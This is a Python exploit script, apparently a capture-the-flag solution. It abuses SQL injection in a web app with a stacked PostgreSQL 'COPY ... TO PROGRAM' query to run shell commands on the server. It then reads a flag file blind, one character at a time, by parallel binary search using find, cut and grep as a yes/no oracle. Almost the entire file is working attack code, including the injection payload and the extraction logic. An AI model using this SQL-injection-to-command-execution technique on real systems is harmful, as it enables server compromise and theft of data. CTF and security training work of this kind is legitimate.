#!/usr/bin/env python
"""Read the flag by position instead of by prefix.

Earlier attempts anchored `^<prefix><class>` and searched left to right.  Two things break that
here: the app lower-cases the payload, so once the flag contains a capital letter the *prefix*
can no longer be written case-sensitively (the confirmation probe failed on position 27 for
exactly that reason); and a sequential search cannot be parallelised.

`cut -c<k>` isolates one character per request, so each position is an independent binary
search over the alphabet, run 10 at a time:

    <extract> | cut -c<k> | grep -q "[class]"      case sensitive
    <extract> | cut -c<k> | grep -qi "[class]"     case insensitive

If the case-insensitive pass matches a letter but the case-sensitive one does not, the byte is
that letter upper-cased.  `grep -q .` on the same cut answers "is there a character here",
which gives the length without needing `$` (the shell would eat it inside double quotes).
"""
import string
import sys
import threading

import extract as E

FIND = ('f=$(find / -name "*flag*" -type f -exec grep -ls sun{ {} + 2>/dev/null | head -1); '
        'grep -aoE "sun[{][^}]*[}]" "$f" | head -1')
LOWER = string.digits + string.ascii_lowercase + "_-.@!+~{}"
CANDS = list("{}" + string.digits + string.ascii_lowercase + "_-.@!+~")


def klass(chars):
    body = "".join(c for c in chars if c != "-")
    return "[" + body + ("-" if "-" in chars else "") + "]"


def ask(cmd):
    payload = "MARS'; COPY (SELECT 1) TO PROGRAM '%s'; SELECT 1; -- " % cmd
    for _ in range(4):
        if E.ask(payload):
            return True
    return False


def at(k, chars, ic=False):
    fl = "grep -q%sE" % ("i" if ic else "")
    return ask("%s | cut -c%d | %s \"%s\"" % (FIND, k, fl, klass(chars)))


def present(k):
    return ask("%s | cut -c%d | grep -q ." % (FIND, k))


def char_at(k):
    if not at(k, CANDS) and at(k, CANDS, True):
        c = _find(k, CANDS, True)
        return c.upper() if c and c.isalpha() else "?"
    return _find(k, CANDS)


def _find(k, cands, ic=False):
    lo, hi = 0, len(cands) - 1
    while lo < hi:
        mid = (lo + hi) // 2
        if at(k, cands[lo:mid + 1], ic):
            hi = mid
        else:
            lo = mid + 1
    return cands[lo] if at(k, [cands[lo]], ic) else None


def length(cap=80):
    lo, hi = 0, cap
    while lo < hi:
        mid = (lo + hi) // 2
        if present(mid + 1):
            lo = mid + 1
        else:
            hi = mid
    return lo


def run(workers=10):
    n = length()
    print("[*] flag is %d characters" % n, flush=True)
    vals = {}
    lock = threading.Lock()
    todo = list(range(1, n + 1))

    def w(k):
        c = char_at(k)
        with lock:
            vals[k] = c or "?"
        print("   %-46s (%d calls)" % ("".join(vals[i] or "?" for i in sorted(vals)), E.CALL[0]),
              flush=True)
    while todo:
        batch = todo[:workers]
        todo = todo[workers:]
        ts = [threading.Thread(target=w, args=(k,), daemon=True) for k in batch]
        for t in ts:
            t.start()
        for t in ts:
            t.join(600)
    return "".join(vals.get(k, "?") for k in range(1, n + 1))


if __name__ == "__main__":
    v = run()
    print("[+] %s" % v, flush=True)
    if v.startswith("sun{") and v.endswith("}") and "?" not in v:
        open("flag.txt", "w").write(v.strip() + "\n")
        print("[*] saved to flag.txt", flush=True)
